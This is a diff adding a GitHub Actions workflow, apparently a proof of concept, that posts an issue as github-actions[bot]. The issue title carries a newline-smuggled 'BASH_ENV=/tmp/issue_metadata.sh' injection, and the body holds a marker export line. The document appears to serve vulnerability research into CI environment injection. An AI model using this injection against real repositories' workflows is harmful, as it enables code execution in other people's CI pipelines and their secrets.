@@ -1,0 +1,33 @@
+name: Cross-principal issue creator (Workflow A)
+on:
+  workflow_dispatch:
+
+permissions:
+  issues: write
+
+jobs:
+  create-malicious-issue:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create issue with BASH_ENV payload as github-actions[bot]
+        run: |
+          # This creates an issue AS github-actions[bot]
+          # The issue title contains the BASH_ENV injection payload
+          RESULT=$(curl -sS -X POST \
+            -H "Authorization: token $GITHUB_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/toofikz/public-test-repo/issues" \
+            -d "$(python3 -c "
+import json
+title = 'bashenv-exec-poc\nBASH_ENV=/tmp/issue_metadata.sh'
+body = 'export CROSS_PRINCIPAL_PROOF=CREATED_BY_GITHUB_ACTIONS_BOT_NOT_TOOFIKZ'
+print(json.dumps({'title': title, 'body': body}))
+")" 2>&1)
+          
+          ISSUE_NUM=$(echo "$RESULT" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('number','FAILED'))" 2>/dev/null)
+          CREATOR=$(echo "$RESULT" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('user',{}).get('login','FAILED'))" 2>/dev/null)
+          
+          echo "Issue #$ISSUE_NUM created by: $CREATOR"
+          echo "If creator is github-actions[bot], this is a DIFFERENT PRINCIPAL from toofikz"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
